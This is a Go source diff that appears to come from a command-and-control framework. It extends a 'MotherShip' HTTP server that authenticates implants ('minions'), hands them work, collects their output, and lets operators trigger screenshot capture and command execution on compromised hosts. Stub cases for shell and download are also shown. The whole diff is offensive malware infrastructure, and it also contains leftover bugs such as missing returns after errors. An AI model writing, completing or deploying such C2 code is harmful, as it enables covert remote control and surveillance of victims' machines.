@@ -5,14 +5,14 @@ package lib
   Minion Functions are implemented(like grpcAdminServer)
 */
 import(
-  "net"
   "fmt"
-  "bytes"
   "errors"
   "net/http"
   "crypto/tls"
+  "io/ioutil"
   "odin/lib/utils"
   "odin/lib/core"
+  "odin/lib/penguins/zoo"
   "github.com/gorilla/sessions"
   "odin/wheagle/server/grpcapi"
 )
@@ -30,18 +30,20 @@ func NewHTTPMS(cave *core.Cave,config *MSRunner,pillar *Pillar) *HTTPMS{
   return &HTTPMS{
     ACave: cave,
     Config: config,
-    APillar: pillar,
+    Plr: pillar,
     OS: utils.GetCurrentOS(),
   }
 }
 
-func (ad *AdminData) StartMS(){
+func (ad *AdminData) RunMothershipHTTP(){
   cave := core.InitializeTunnelMan()
   pillar := InitializePillar()
   msr := SetRunningConfigurations(ad.Ad.MSId,ad.Ad.Password)
   srv := NewHTTPMS(cave,msr,pillar)
   http.HandleFunc("/auth/",srv.Authenticate)
   http.HandleFunc("/adminauth/",srv.AdminAuthenticate)
+  http.HandleFunc("/logout/",srv.Logout)
+  http.HandleFunc("/",srv.Wheagle)
   http.HandleFunc("/getwork",srv.Getwork)
   http.HandleFunc("/output",srv.ReceiveOut)
   http.HandleFunc("/getout",srv.AdminGetOut)
@@ -81,7 +83,6 @@ func (srv *HTTPMS) Sendfile(res http.ResponseWriter,req *http.Request){
   return
 }
 
-
 func (srv *HTTPMS) ReceiveFile(res http.ResponseWriter,req *http.Request){
   return
 }
@@ -91,7 +92,7 @@ func (srv *HTTPMS) Getwork(res http.ResponseWriter,req *http.Request){
   mid,auth := srv.IsAuthenticated(req,false)
   if !auth{
     res.WriteHeader(http.StatusUnauthorized)
-    fmr.Fprintf(res,"Login to get work.")
+    fmt.Fprintf(res,"Login to get work.")
     return
   }
   var cmd = new(grpcapi.Command)
@@ -128,7 +129,7 @@ func (srv *HTTPMS) ReceiveOut(res http.ResponseWriter,req *http.Request){
   _,auth := srv.IsAuthenticated(req,false)
   if !auth {
     res.WriteHeader(http.StatusUnauthorized)
-    fmr.Fprintf(res,"Login to get work.")
+    fmt.Fprintf(res,"Login to get work.")
     return
   }
   //read the body,decode it,say okay or try again
@@ -145,21 +146,83 @@ func (srv *HTTPMS) ReceiveOut(res http.ResponseWriter,req *http.Request){
 	fmt.Fprintln(res, "Workout data received and processed successfully.")
 }
 
-// now make the clients
+// oly receives get requests
+func (srv *HTTPMS) Wheagle(res http.ResponseWriter, req *http.Request){
+  _,auth := srv.IsAuthenticated(req,true)
+  if !auth {
+    res.WriteHeader(http.StatusUnauthorized)
+    fmt.Fprintf(res,"Authenticate first to get access to MotherShip.")
+    return
+  }
+  work,err := OPDecodeCommandFromBody(req)
+  if err != nil {
+    res.WriteHeader(http.StatusBadRequest)
+    fmt.Fprintf(res,fmt.Sprintf("%s",err))
+  }
+  if work.MSId != srv.Config.MSId {
+    res.WriteHeader(http.StatusNoContent)
+    fmt.Fprintf(res,"Get your mothership straight.")
+  }
+  if work.Individual{
+    switch work.In {
+      case "screenshot":
+        var scrnshts []string
+        screenshots := zoo.TakeScreenShot()
+        for _,s := range screenshots.SCS{
+          scrnshts = append(scrnshts,s.Screenshot)
+        }
+        //scts :=make([][]string)
+        scn := &grpcapi.Screenshots{
+          Screenshot: scrnshts,
+        }
+        data,err := grpcapi.EncodeScreenShot(scn)
+        if err != nil {
+          res.WriteHeader(http.StatusInternalServerError)
+          fmt.Fprintf(res,fmt.Sprintf("Error emcoding screenshot: %s",err))
+          return
+        }
+        res.WriteHeader(http.StatusOK)
+        res.Header().Set("Content-Type", "application/octet-stream")
+        if _,err := res.Write(data); err != nil {
+          utils.NoticeError(fmt.Sprintf("%s",err))
+          http.Error(res,"Failed to write the response",http.StatusInternalServerError);return
+        }
+        return
+
+      case "shell":
+      case "download":
+      default:
+        work.Out = AdminCommandHandler(work.In)
+        data,err := grpcapi.OPWorkEncode(work)
+        if err != nil{
+          res.WriteHeader(http.StatusInternalServerError)
+          fmt.Fprintf(res,fmt.Sprintf("Error encoding work output: %s",err))
+          return
+        }
+        res.WriteHeader(http.StatusOK)
+        res.Header().Set("Content-Type", "application/octet-stream")
+        if _,err := res.Write(data); err != nil {
+          utils.NoticeError(fmt.Sprintf("%s",err))
+          http.Error(res,"Failed to write the response",http.StatusInternalServerError);return
+        }
+        return
+    }
+  }
+}
 
 func (srv *HTTPMS) AdminAddWork(res http.ResponseWriter,req *http.Request){
   _,auth := srv.IsAuthenticated(req,true)
+  if !auth {
+    res.WriteHeader(http.StatusUnauthorized)
+    fmt.Fprintf(res,"Authenticate first to get access to MotherShip.")
+    return
+  }
   cmd,err := DecodeCommandFromBody(req)
   if err != nil {
     utils.NoticeError(fmt.Sprintf("%s",err))
     fmt.Fprintf(res,"Try Again.")
   }
-  work := &Jacuzzi{
-    OperatorId: cmd.OperatorId,
-    CmdIn: cmd.In,
-    Done: false,
-  }
-  if err := srv.AddWork(cmd.UserId,work); err != nil {
+  if err := srv.AddWork(cmd); err != nil {
     res.WriteHeader(http.StatusInternalServerError)
     fmt.Fprintf(res,fmt.Sprintf("%s",err))
     return
@@ -215,11 +278,25 @@ func DecodeCommandFromBody(req *http.Request) (*grpcapi.Command, error) {
   return grpcapi.WorkDecode(body)
 }
 
+func OPDecodeCommandFromBody(req *http.Request) (*grpcapi.C2Command, error) {
+	// Ensure the request method is POST
+	if req.Method != "GET" {
+		return nil, fmt.Errorf("Invalid request method: %s", req.Method)
+	}
+	// Read the request body (encoded Command)
+	body, err := ioutil.ReadAll(req.Body)
+	if err != nil {
+		return nil, fmt.Errorf("Failed to read request body: %s", err)
+	}
+	// Decode the body (encoded Command) into a Command struct
+  return grpcapi.OPWorkDecode(body)
+}
+
 func (srv *HTTPMS) GetWorkOut(cmd *grpcapi.Command)(workDone *grpcapi.Command,err error){
   if workDone,err := srv.Plr.GetWorkDone(cmd); err != nil{
-    return
+    return workDone,nil
   }
-  return &workDone,nil
+  return workDone,nil
 }
 
 func (srv *HTTPMS) AddWorkOutput(result *grpcapi.Command) error {
@@ -264,7 +341,7 @@ func (srv *HTTPMS) IsAuthenticated(req *http.Request,admin bool) (string,bool) {
     }
   } else {
     //check for implant auth
-    ,ok := session.Values["MinionId"].(string)
+    id,ok := session.Values["MinionId"].(string)
     if !ok {
       return id,false
     }
@@ -288,6 +365,7 @@ func (srv *HTTPMS) Authenticate(res http.ResponseWriter,req *http.Request){
     res.WriteHeader(http.StatusBadRequest)
     return
   }
+  session,_ := store.Get(req,"session")
   mid := req.URL.Query().Get("mid")
   msid := req.URL.Query().Get("msid")
   if srv.Config.MSId == msid{
@@ -311,14 +389,16 @@ func (srv *HTTPMS) Authenticate(res http.ResponseWriter,req *http.Request){
 }
 
 // add a way to encrypt the sent password
+// add OPERATOR ID TO OPERATORS
 func (srv *HTTPMS) AdminAuthenticate(res http.ResponseWriter, req *http.Request){
   pass := req.URL.Query().Get("pass")
-  if err :=  srv.Config.MSAuthenticate(pass){
+  if err :=  srv.Config.MSAuthenticate(pass); err != nil {
     utils.Logerror(err)
     res.WriteHeader(http.StatusBadRequest)
     fmt.Fprintf(res,fmt.Sprintf("Error Authenticating admin: %s",err))
     return
   }
+  session,_ := store.Get(req,"session")
   // create an add operator method( base it on ip and opid)
   opid := utils.GenerateUUID()
   session.Values["OpId"] = opid
@@ -350,7 +430,6 @@ func (srv *HTTPMS) Logout(res http.ResponseWriter, req *http.Request){
   fmt.Fprintf(res,"You must take me for a fool.!!!")
   return
 }
-
 
 type DNS struct{
   Port int
